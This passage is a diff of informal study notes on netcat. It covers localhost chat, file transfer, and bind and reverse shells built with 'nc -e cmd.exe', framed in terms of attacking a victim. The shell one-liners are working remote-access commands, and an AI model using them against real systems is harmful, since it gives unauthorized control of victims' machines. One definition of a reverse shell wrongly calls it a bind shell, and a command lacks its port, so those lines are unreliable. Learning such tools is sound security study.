@@ -2,8 +2,52 @@
 <now connected to google, we will execute the command>
 GET \
 
-one terminal:
+-
+terminal 1 - server
+terminal 2 - client
+-
+
+terminal 1:
 nc -vlp 1234
 
-another terminal:
+terminal 2:
 nc -nv 127.0.0.1 (n - no dns and connected now we can message each terminal)
+
+-
+
+terminal 1:
+nc -lvp 1234 < test.txt (when connection is successful, content in the file will be displayed to client)
+
+terminal 2:
+nc -nv 127.0.0.1 1234
+
+-
+
+terminal 1:
+nc -lvp 1234 < test.txt
+
+terminal 2:
+nc -nv 127.0.0.1 1234 > sample.txt (it will get the test.txt file and save it as sample.txt)
+
+-
+(bind shell) - if client request to server and client get shell means - it is bind shell
+in attack basis, server will be running on victim, if i request for connection, i will get shell of victim.
+If I try to connect and I get shell means - it is bind shell
+
+terminal 1:
+nc -lvp 1234 -e cmd.exe
+
+terminal 2:
+nc -nv 127.0.0.1 1234 (will get terminal 1 cmdline in terminal 2)
+
+-
+
+(reverse shell) - if any request to the server, server will get shell means - bind shell
+in attack basis, i running a server, when victim beacons to my server, i get shell.
+If victim connects to me and I get shell means - is it reverse shell
+
+terminal 1:
+nc -lvp 1234
+
+terminal 2:
+nc 127.0.0.1 1234 -e cmd.exe
